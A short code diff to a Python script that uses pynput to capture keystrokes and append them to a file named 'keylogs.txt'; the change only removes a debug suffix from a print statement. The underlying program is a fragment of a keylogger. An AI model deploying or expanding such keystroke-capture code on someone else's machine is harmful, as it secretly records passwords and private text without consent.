@@ -1,7 +1,7 @@
 from pynput import keyboard
 
 def keyPressed(key):
-    print(str(key) + 'aaa')
+    print(str(key))
     try:
         with open("keylogs.txt", "a") as logKey:
             try:
